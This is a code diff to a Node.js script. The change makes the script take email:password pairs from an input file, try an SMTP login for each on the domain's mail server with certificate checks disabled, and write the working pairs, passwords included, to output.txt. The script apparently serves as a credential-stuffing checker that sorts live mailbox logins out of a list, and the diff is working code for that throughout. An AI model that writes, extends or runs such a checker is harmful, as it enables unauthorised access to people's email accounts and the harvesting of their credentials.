@@ -2,6 +2,7 @@ console.log("Hello World");
 
 var shell = require('shelljs');
 var fs = require('fs');
+var nodemailer = require('nodemailer');
 
 function extractTLS(domain, port){
 
@@ -27,7 +28,43 @@ function extractTLS(domain, port){
 
 }
 
-function process(user, pass){
+function validateAccount(host, port = 465, user, pass, useSSL = false){
+
+    var transporter = nodemailer.createTransport( {
+        host: host, // hostname
+        secureConnection: useSSL, // use SSL
+        port: port, // port for secure SMTP
+        auth: {
+            user: user,
+            pass: pass
+        },
+        tls: {
+            // do not fail on invalid certs
+            rejectUnauthorized: false
+        }
+    });
+
+    // verify connection configuration
+
+    return new Promise((resolve)=>{
+
+        var verification = transporter.verify(function(error, success) {
+            if (error) {
+
+                resolve({result: false, message: error.message})
+            } else {
+                console.log('Server is ready to take our messages');
+                resolve({result: true})
+            }
+        });
+
+        //console.log("verification", verification)
+
+    });
+
+}
+
+async function process(user, pass){
 
     var domain = user.substr( user.indexOf("@")+1 );
 
@@ -56,6 +93,8 @@ function process(user, pass){
 
     var answer = {
         result: false,
+        domain: domain,
+        message: '',
     };
 
     var ok =false;
@@ -82,27 +121,52 @@ function process(user, pass){
             var r = extractTLS(server, 25)
             if (r.result){
 
+                var validation = await validateAccount(server, 25, user, pass, false );
+
+                if (!validation.result) {
+                    answer.message = validation.message;
+                    continue;
+                }
+
                 return {
                     result: true,
                     domain: domain,
                     mx: server,
                     tls: r.protocol,
+                    verified: true,
                 };
+
+            } else {
+
+                var validation = await validateAccount(server, 25, user, pass, false );
+
+                if (!validation.result) {
+                    answer.message = validation.message;
+                    continue;
+                }
+
+                return {
+                    result: true,
+                    domain: domain,
+                    mx: server,
+                    tls: '',
+                    verified: true,
+
+                }
 
             }
         }
 
     }
 
-    return {
-        result: false,
-        domain: domain
-    }
-
+    return answer;
 }
 
-function read(){
+
+async function read(){
+
     var output = fs.createWriteStream( "output.txt", { flags: 'w' } );
+    var outputErr = fs.createWriteStream( "outputErr.txt", { flags: 'w' } );
 
     var emails = fs.readFileSync('input.txt', 'utf8');
     emails = emails.split("\n");
@@ -115,10 +179,12 @@ function read(){
         var pass = data[1];
 
         if (email !== undefined && pass !== undefined){
-            var answer = process(email, pass);
+            var answer = await process(email, pass);
 
             if (answer.result) {
-                output.write( answer.domain +" "+ answer.mx +" "+ answer.tls + "\n");
+                output.write( answer.domain +" "+ answer.mx +" "+ answer.tls +" "+ " "+email + " "+pass+ " "+answer.verified+ "\n");
+            } else {
+                outputErr.write( email+" "+ pass+" "+answer.message + "\n" );
             }
 
         }
